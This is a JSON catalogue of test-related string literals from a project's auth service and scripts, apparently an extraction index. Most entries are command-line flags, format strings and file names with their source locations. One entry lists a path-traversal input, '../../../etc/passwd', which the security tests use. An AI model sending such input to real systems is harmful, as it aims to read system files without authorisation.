    "--quick": {
      "value": "--quick",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:433",
        "scripts/test_staging.py:75"
      ]
    },
    "--quiet": {
      "value": "--quiet",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:113",
        "scripts/ci/check_test_stubs.py:107",
        "scripts/test_backend.py:502",
        "scripts/test_backend_optimized.py:390"
      ]
    },
    "--real-e2e": {
      "value": "--real-e2e",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:166"
      ]
    },
    "--real-llm": {
      "value": "--real-llm",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:749"
      ]
    },
    "--real-services": {
      "value": "--real-services",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:755"
      ]
    },
    "--reload": {
      "value": "--reload",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:58"
      ]
    },
    "--repo": {
      "value": "--repo",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:44",
        "scripts/test_verify_workflow.py:62",
        "scripts/test_verify_workflow_status.py:90",
        "scripts/test_verify_workflow_status.py:97",
        "scripts/test_verify_workflow_status.py:106",
        "scripts/test_verify_workflow_status.py:113",
        "scripts/test_verify_workflow_status.py:122",
        "scripts/test_verify_workflow_status.py:131",
        "scripts/test_verify_workflow_status.py:140",
        "scripts/test_verify_workflow_status.py:147"
      ]
    },
    "--report": {
      "value": "--report",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:262",
        "scripts/remove_test_stubs.py:357"
      ]
    },
    "--report-only": {
      "value": "--report-only",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:929",
        "scripts/compliance/fake_test_scanner.py:380"
      ]
    },
    "--resume-from": {
      "value": "--resume-from",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:828"
      ]
    },
    "--root-dir": {
      "value": "--root-dir",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:927"
      ]
    },
    "--run-id": {
      "value": "--run-id",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:97",
        "scripts/test_verify_workflow_status.py:155",
        "scripts/test_verify_workflow_status_corrected.py:106",
        "scripts/test_verify_workflow_status_corrected.py:150"
      ]
    },
    "--scan": {
      "value": "--scan",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:355"
      ]
    },
    "--scan-all": {
      "value": "--scan-all",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:374"
      ]
    },
    "--secret-file": {
      "value": "--secret-file",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:115",
        "scripts/test_workflows_with_act.py:154"
      ]
    },
    "--self-contained-html": {
      "value": "--self-contained-html",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:280"
      ]
    },
    "--service": {
      "value": "--service",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:99",
        "scripts/start_test_services.py:107"
      ]
    },
    "--show-category-stats": {
      "value": "--show-category-stats",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:854"
      ]
    },
    "--show-warnings": {
      "value": "--show-warnings",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:511"
      ]
    },
    "--simulate": {
      "value": "--simulate",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:287"
      ]
    },
    "--spec": {
      "value": "--spec",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:227",
        "scripts/test_frontend.py:229"
      ]
    },
    "--splitting-strategy": {
      "value": "--splitting-strategy",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:839"
      ]
    },
    "--strategy": {
      "value": "--strategy",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:679"
      ]
    },
    "--strict": {
      "value": "--strict",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:258",
        "scripts/compliance/test_size_validator.py:524"
      ]
    },
    "--strict-markers": {
      "value": "--strict-markers",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:284"
      ]
    },
    "--tb=no": {
      "value": "--tb=no",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:101"
      ]
    },
    "--tb=short": {
      "value": "--tb=short",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:264",
        "scripts/auto_fix_test_violations.py:733",
        "scripts/comprehensive_test_fixer.py:367",
        "scripts/fix_common_test_issues.py:44",
        "scripts/fix_test_batch.py:271",
        "scripts/startup_test_executor.py:70",
        "scripts/startup_test_executor.py:223",
        "scripts/test_backend.py:284",
        "scripts/test_example_message_flow.py:93"
      ]
    },
    "--testMatch": {
      "value": "--testMatch",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:186",
        "scripts/test_frontend.py:188",
        "scripts/test_frontend.py:190",
        "scripts/test_frontend_simple.py:36",
        "scripts/test_frontend_simple.py:37",
        "scripts/test_frontend_simple.py:38",
        "scripts/test_frontend_simple.py:40"
      ]
    },
    "--testNamePattern=": {
      "value": "--testNamePattern=",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:147"
      ]
    },
    "--testPathPattern=__tests__/(components|hooks|store)": {
      "value": "--testPathPattern=__tests__/(components|hooks|store)",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:58"
      ]
    },
    "--timeout-keep-alive": {
      "value": "--timeout-keep-alive",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:63",
        "auth_service/tests/test_auth_startup_integration.py:258"
      ]
    },
    "--timeout=": {
      "value": "--timeout=",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:381"
      ]
    },
    "--timeout=5": {
      "value": "--timeout=5",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:102"
      ]
    },
    "--token": {
      "value": "--token",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:113",
        "scripts/test_verify_workflow_status.py:122",
        "scripts/test_verify_workflow_status.py:131",
        "scripts/test_verify_workflow_status.py:140",
        "scripts/test_verify_workflow_status.py:147",
        "scripts/test_verify_workflow_status.py:155",
        "scripts/test_verify_workflow_status_corrected.py:128",
        "scripts/test_verify_workflow_status_corrected.py:141",
        "scripts/test_verify_workflow_status_corrected.py:150",
        "scripts/test_verify_workflow_status_corrected.py:163"
      ]
    },
    "--type-check": {
      "value": "--type-check",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:409"
      ]
    },
    "--update-snapshots": {
      "value": "--update-snapshots",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:402"
      ]
    },
    "--updateSnapshot": {
      "value": "--updateSnapshot",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:143"
      ]
    },
    "--validate": {
      "value": "--validate",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:860"
      ]
    },
    "--validate-tests": {
      "value": "--validate-tests",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:933"
      ]
    },
    "--verbose": {
      "value": "--verbose",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:388",
        "scripts/test_backend.py:501",
        "scripts/test_backend_optimized.py:388",
        "scripts/test_example_message_flow.py:434",
        "scripts/test_frontend.py:145",
        "scripts/test_frontend.py:417",
        "scripts/test_imports.py:49",
        "scripts/test_staging_migrations.py:247",
        "scripts/unified_test_runner.py:583",
        "scripts/unified_test_runner.py:794"
      ]
    },
    "--version": {
      "value": "--version",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:80",
        "scripts/test_frontend.py:87",
        "scripts/test_frontend_simple.py:29",
        "scripts/test_workflows_with_act.py:39",
        "scripts/test_workflows_with_act.py:56"
      ]
    },
    "--wait-for-completion": {
      "value": "--wait-for-completion",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:97",
        "scripts/test_verify_workflow_status_corrected.py:106"
      ]
    },
    "--wait-for-completion requires --workflow-name": {
      "value": "--wait-for-completion requires --workflow-name",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:108"
      ]
    },
    "--watch": {
      "value": "--watch",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:141",
        "scripts/test_frontend.py:400"
      ]
    },
    "--window-size": {
      "value": "--window-size",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:806"
      ]
    },
    "--workers": {
      "value": "--workers",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:781"
      ]
    },
    "--workflow-name": {
      "value": "--workflow-name",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:62",
        "scripts/test_verify_workflow_status.py:106",
        "scripts/test_verify_workflow_status.py:113",
        "scripts/test_verify_workflow_status.py:122",
        "scripts/test_verify_workflow_status.py:131",
        "scripts/test_verify_workflow_status.py:140",
        "scripts/test_verify_workflow_status.py:147",
        "scripts/test_verify_workflow_status_corrected.py:119",
        "scripts/test_verify_workflow_status_corrected.py:128",
        "scripts/test_verify_workflow_status_corrected.py:141"
      ]
    },
    "-01": {
      "value": "-01",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:687"
      ]
    },
    "-5": {
      "value": "-5",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:350"
      ]
    },
    "->": {
      "value": "->",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:121",
        "scripts/fix_e2e_test_imports.py:152",
        "scripts/fix_e2e_test_imports.py:160",
        "scripts/fix_e2e_test_imports.py:169",
        "scripts/fix_test_import_errors.py:184",
        "scripts/standardize_l3_test_names.py:161",
        "scripts/test_staging_startup.py:90"
      ]
    },
    "-P": {
      "value": "-P",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:116",
        "scripts/test_workflows_with_act.py:155"
      ]
    },
    "-W": {
      "value": "-W",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:114",
        "scripts/test_workflows_with_act.py:153"
      ]
    },
    "-_": {
      "value": "-_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:110",
        "auth_service/tests/unit/test_oauth_models.py:236",
        "auth_service/tests/unit/test_oauth_state_security.py:51"
      ]
    },
    "-b": {
      "value": "-b",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:410"
      ]
    },
    "-c": {
      "value": "-c",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:192",
        "scripts/test_backend.py:194",
        "scripts/test_backend.py:481",
        "scripts/test_backend_optimized.py:368",
        "scripts/test_frontend.py:388",
        "scripts/test_staging_migrations.py:146"
      ]
    },
    "-d": {
      "value": "-d",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:47"
      ]
    },
    "-e": {
      "value": "-e",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:160"
      ]
    },
    "-f": {
      "value": "-f",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:149",
        "scripts/compliance/fake_test_scanner.py:386",
        "scripts/start_test_services.py:45"
      ]
    },
    "-h": {
      "value": "-h",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:298"
      ]
    },
    "-k": {
      "value": "-k",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:235",
        "scripts/startup_test_executor.py:237",
        "scripts/test_backend.py:271",
        "scripts/test_backend.py:482",
        "scripts/test_frontend.py:389",
        "scripts/unified_test_runner.py:508",
        "scripts/unified_test_runner.py:509",
        "scripts/unified_test_runner.py:510",
        "scripts/unified_test_runner.py:511",
        "scripts/unified_test_runner.py:547"
      ]
    },
    "-l": {
      "value": "-l",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:154",
        "scripts/standardize_l3_test_names.py:256",
        "scripts/test_frontend.py:407",
        "scripts/test_workflows_with_act.py:113"
      ]
    },
    "-m": {
      "value": "-m",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:524",
        "auth_service/tests/test_auth_startup_integration.py:59",
        "auth_service/tests/test_auth_startup_integration.py:254",
        "auth_service/tests/test_auth_startup_integration.py:263",
        "scripts/auto_fix_test_violations.py:733",
        "scripts/autonomous_review/test_reviewer.py:113",
        "scripts/comprehensive_test_fixer.py:364",
        "scripts/fix_test_batch.py:270",
        "scripts/startup_test_executor.py:68",
        "scripts/startup_test_executor.py:221"
      ]
    },
    "-n": {
      "value": "-n",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:250",
        "scripts/test_backend.py:229",
        "scripts/test_backend.py:231",
        "scripts/test_workflows_with_act.py:156",
        "scripts/unified_test_config.py:354",
        "scripts/unified_test_runner.py:535"
      ]
    },
    "-name": {
      "value": "-name",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:62",
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:68",
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:68",
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:68",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:65",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:65",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:65",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:71"
      ]
    },
    "-o": {
      "value": "-o",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:68",
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:68",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:65",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:65",
        "scripts/business_value_test_index.py:549",
        "scripts/compliance/fake_test_scanner.py:384",
        "scripts/compliance/test_size_validator.py:521",
        "scripts/test_backend_optimized.py:373"
      ]
    },
    "-p": {
      "value": "-p",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:47",
        "scripts/start_test_services.py:46",
        "scripts/test_backend.py:287",
        "scripts/test_backend.py:488"
      ]
    },
    "-q": {
      "value": "-q",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:69",
        "scripts/startup_test_executor.py:222",
        "scripts/test_backend.py:502",
        "scripts/test_backend_optimized.py:390",
        "scripts/test_failure_scanner.py:101",
        "scripts/unified_test_config.py:373"
      ]
    },
    "-rN": {
      "value": "-rN",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:102"
      ]
    },
    "-s": {
      "value": "-s",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:223"
      ]
    },
    "-t": {
      "value": "-t",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:409"
      ]
    },
    "-type": {
      "value": "-type",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:62",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:71"
      ]
    },
    "-u": {
      "value": "-u",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:402"
      ]
    },
    "-v": {
      "value": "-v",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:190",
        "auth_service/tests/test_auth_database_connection.py:82",
        "auth_service/tests/test_critical_staging_issues.py:264",
        "auth_service/tests/test_postgres_compliance.py:254",
        "auth_service/tests/test_setup.py:50",
        "auth_service/tests/test_single_database.py:119",
        "auth_service/tests/unit/test_oauth_models.py:249",
        "scripts/compliance/fake_test_scanner.py:388",
        "scripts/fix_common_test_issues.py:43",
        "scripts/startup_test_executor.py:69"
      ]
    },
    "-vv": {
      "value": "-vv",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:222",
        "scripts/unified_test_config.py:371",
        "scripts/unified_test_runner.py:539"
      ]
    },
    "-w": {
      "value": "-w",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:400"
      ]
    },
    "-x": {
      "value": "-x",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:248",
        "scripts/test_backend.py:489",
        "scripts/unified_test_config.py:377",
        "scripts/unified_test_runner.py:543"
      ]
    },
    "-xvs": {
      "value": "-xvs",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:733",
        "scripts/comprehensive_test_fixer.py:366",
        "scripts/fix_test_batch.py:271"
      ]
    },
    ".": {
      "value": ".",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:62",
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:68",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:65",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:71",
        "auth_service/test_url_construction.py:208",
        "auth_service/tests/base/test_base.py:163",
        "auth_service/tests/base/test_mixins.py:38",
        "auth_service/tests/base/test_mixins.py:58",
        "auth_service/tests/test_auth_token_generation.py:55",
        "auth_service/tests/test_auth_token_security.py:103"
      ]
    },
    ". Consider consolidating or improving test coverage.": {
      "value": ". Consider consolidating or improving test coverage.",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:478"
      ]
    },
    ". Testing URL:": {
      "value": ". Testing URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:178"
      ]
    },
    ". [": {
      "value": ". [",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:240"
      ]
    },
    ". `": {
      "value": ". `",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:885"
      ]
    },
    ".\"\"\"": {
      "value": ".\"\"\"",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:575"
      ]
    },
    ".\"\"\"\n    return {\"status\": \"ok\"}": {
      "value": ".\"\"\"\n    return {\"status\": \"ok\"}",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:165"
      ]
    },
    "...": {
      "value": "...",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:352",
        "auth_service/tests/test_oauth_id_token_validation.py:129",
        "auth_service/tests/test_oauth_id_token_validation.py:131",
        "auth_service/tests/test_password_hashing_basics.py:62",
        "auth_service/tests/test_password_hashing_basics.py:68",
        "auth_service/tests/test_password_hashing_basics.py:74",
        "auth_service/tests/test_password_hashing_basics.py:91",
        "auth_service/tests/test_password_hashing_basics.py:94",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:111",
        "scripts/analyze_test_overlap.py:71"
      ]
    },
    "...\n[bold]Redirect URI:[/bold]": {
      "value": "...\n[bold]Redirect URI:[/bold]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:153"
      ]
    },
    "... and": {
      "value": "... and",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:437",
        "scripts/align_test_imports.py:449",
        "scripts/check_test_compliance.py:169",
        "scripts/check_test_compliance.py:179",
        "scripts/check_test_compliance.py:187",
        "scripts/check_test_import_order.py:93",
        "scripts/ci/check_test_stubs.py:52",
        "scripts/compliance/real_test_linter.py:212",
        "scripts/compliance/real_test_requirements_enforcer.py:539",
        "scripts/compliance/real_test_validator.py:305"
      ]
    },
    "...[/cyan]": {
      "value": "...[/cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:193",
        "scripts/test_oauth_local.py:254"
      ]
    },
    "../../../etc/passwd": {
      "value": "../../../etc/passwd",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:102",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:449"
      ]
    },
    "../reports/frontend-coverage": {
      "value": "../reports/frontend-coverage",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:136"
      ]
    },
    ".1%": {
      "value": ".1%",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:297",
        "auth_service/tests/auth-service-down-critical-scenarios.py:298",
        "scripts/compliance/demo_test_size_enforcement.py:97",
        "scripts/compliance/test_refactor_helper.py:722",
        "scripts/real_service_test_metrics.py:175"
      ]
    },
    ".1f": {
      "value": ".1f",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:465",
        "scripts/analyze_test_overlap.py:563",
        "scripts/automated_test_fix_loop.py:143",
        "scripts/autonomous_review/test_reviewer.py:134",
        "scripts/batch_fix_and_test.py:123",
        "scripts/batch_fix_and_test.py:133",
        "scripts/business_value_test_index.py:694",
        "scripts/business_value_test_index.py:701",
        "scripts/business_value_test_index.py:738",
        "scripts/business_value_test_index.py:743"
      ]
    },
    ".2%": {
      "value": ".2%",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:336",
        "scripts/unified_test_runner.py:908"
      ]
    },
    ".2f": {
      "value": ".2f",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:56",
        "auth_service/tests/auth-service-down-critical-scenarios.py:109",
        "auth_service/tests/auth-service-down-critical-scenarios.py:119",
        "auth_service/tests/auth-service-down-critical-scenarios.py:340",
        "auth_service/tests/auth-service-down-critical-scenarios.py:347",
        "auth_service/tests/auth-service-down-critical-scenarios.py:486",
        "auth_service/tests/test_auth_token_security.py:430",
        "auth_service/tests/test_graceful_shutdown_failures.py:75",
        "auth_service/tests/test_graceful_shutdown_failures.py:235",
        "scripts/real_service_test_metrics.py:125"
      ]
    },
    ".3f": {
      "value": ".3f",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:189",
        "auth_service/tests/test_auth_token_validation.py:216",
        "auth_service/tests/test_password_hashing_basics.py:203",
        "auth_service/tests/test_password_hashing_basics.py:211",
        "auth_service/tests/unit/test_oauth_state_security.py:235",
        "scripts/real_service_test_metrics.py:185",
        "scripts/real_service_test_metrics.py:186",
        "scripts/real_service_test_metrics.py:187"
      ]
    },
    ".4f": {
      "value": ".4f",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:215",
        "scripts/real_service_test_metrics.py:150",
        "scripts/real_service_test_metrics.py:151"
      ]
    },
    ".6f": {
      "value": ".6f",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:430",
        "auth_service/tests/test_auth_token_security.py:430"
      ]
    },
    ".<40": {
      "value": ".<40",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:184"
      ]
    },
    ".cache": {
      "value": ".cache",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:129"
      ]
    },
    ".coverage": {
      "value": ".coverage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:133",
        "scripts/business_value_test_index.py:546",
        "scripts/compliance/real_test_requirements_enforcer.py:134",
        "scripts/generate_test_audit.py:26"
      ]
    },
    ".db": {
      "value": ".db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:131"
      ]
    },
    ".eggs": {
      "value": ".eggs",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:132"
      ]
    },
    ".env": {
      "value": ".env",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:118",
        "scripts/business_value_test_index.py:131",
        "scripts/compliance/project_test_validator.py:42",
        "scripts/generate_test_audit.py:22"
      ]
    },
    ".env.test": {
      "value": ".env.test",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:61",
        "scripts/unified_test_config.py:166",
        "scripts/unified_test_config.py:175",
        "scripts/unified_test_config.py:184",
        "scripts/unified_test_runner.py:222"
      ]
    },
    ".env.test*": {
      "value": ".env.test*",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:89"
      ]
    },
    ".git": {
      "value": ".git",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:103",
        "scripts/business_value_test_index.py:130",
        "scripts/check_conftest_violations.py:22",
        "scripts/compliance/project_test_validator.py:41",
        "scripts/compliance/real_test_requirements_enforcer.py:133",
        "scripts/compliance/test_size_validator.py:157",
        "scripts/fix_all_test_issues.py:16",
        "scripts/generate_test_audit.py:23",
        "scripts/remove_test_stubs.py:79"
      ]
    },
    ".github": {
      "value": ".github",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:27"
      ]
    },
    ".idea": {
      "value": ".idea",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:135"
      ]
    },
    ".invalid_signature": {
      "value": ".invalid_signature",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:140"
      ]
    },
    ".jpg": {
      "value": ".jpg",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/user_factory.py:87"
      ]
    },
    ".js": {
      "value": ".js",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:319",
        "scripts/compliance/real_test_requirements_enforcer.py:174",
        "scripts/remove_test_stubs.py:84"
      ]
    },
    ".json": {
      "value": ".json",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:404",
        "scripts/fix_test_batch.py:372",
        "scripts/iterative_test_fix_loop.py:22",
        "scripts/test_staging_deployment.py:225",
        "scripts/test_workflows_with_act.py:198",
        "scripts/unified_test_runner.py:684"
      ]
    },
    ".jsx": {
      "value": ".jsx",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:319",
        "scripts/compliance/real_test_requirements_enforcer.py:174",
        "scripts/remove_test_stubs.py:84"
      ]
    },
    ".mypy_cache": {
      "value": ".mypy_cache",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:133",
        "scripts/generate_test_audit.py:26"
      ]
    },
    ".py": {
      "value": ".py",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:149",
        "scripts/analyze_test_overlap.py:98",
        "scripts/auto_fix_test_sizes.py:277",
        "scripts/auto_fix_test_violations.py:106",
        "scripts/auto_fix_test_violations.py:374",
        "scripts/automated_test_fix_loop.py:36",
        "scripts/autonomous_review/test_reviewer.py:304",
        "scripts/autonomous_review/test_reviewer.py:307",
        "scripts/autonomous_review/test_reviewer.py:309",
        "scripts/autonomous_review/test_reviewer.py:310"
      ]
    },
    ".pytest_cache": {
      "value": ".pytest_cache",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:132",
        "scripts/check_conftest_violations.py:23",
        "scripts/compliance/project_test_validator.py:41",
        "scripts/compliance/real_test_requirements_enforcer.py:134",
        "scripts/compliance/test_size_validator.py:157",
        "scripts/generate_test_audit.py:25",
        "scripts/remove_test_stubs.py:80"
      ]
    },
    ".return_value =": {
      "value": ".return_value =",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:358"
      ]
    },
    ".ruff_cache": {
      "value": ".ruff_cache",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:133"
      ]
    },
    ".secrets": {
      "value": ".secrets",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:71",
        "scripts/test_workflows_with_act.py:90",
        "scripts/test_workflows_with_act.py:115",
        "scripts/test_workflows_with_act.py:154"
      ]
    },
    ".service_discovery": {
      "value": ".service_discovery",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:64"
      ]
    },
    ".signature": {
      "value": ".signature",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:630",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:126"
      ]
    },
    ".tampered": {
      "value": ".tampered",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:395"
      ]
    },
    ".test": {
      "value": ".test",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:116",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:121"
      ]
    },
    ".test.": {
      "value": ".test.",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:202",
        "scripts/remove_test_stubs.py:99"
      ]
    },
    ".test.ts": {
      "value": ".test.ts",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:323",
        "scripts/test_frontend.py:175"
      ]
    },
    ".test.tsx": {
      "value": ".test.tsx",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:205",
        "scripts/autonomous_review/test_reviewer.py:207",
        "scripts/autonomous_review/test_reviewer.py:321",
        "scripts/autonomous_review/test_reviewer.py:322",
        "scripts/test_frontend.py:175"
      ]
    },
    ".test_backups_": {
      "value": ".test_backups_",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:753"
      ]
    },
    ".tox": {
      "value": ".tox",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:132",
        "scripts/check_conftest_violations.py:23",
        "scripts/compliance/test_size_validator.py:157",
        "scripts/generate_test_audit.py:25"
      ]
    },
    ".ts": {
      "value": ".ts",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:319",
        "scripts/compliance/real_test_requirements_enforcer.py:174",
        "scripts/remove_test_stubs.py:84"
      ]
    },
    ".tsx": {
      "value": ".tsx",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:319",
        "scripts/compliance/real_test_requirements_enforcer.py:174",
        "scripts/remove_test_stubs.py:84"
      ]
    },
    ".venv": {
      "value": ".venv",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:78",
        "scripts/auto_fix_test_violations.py:103",
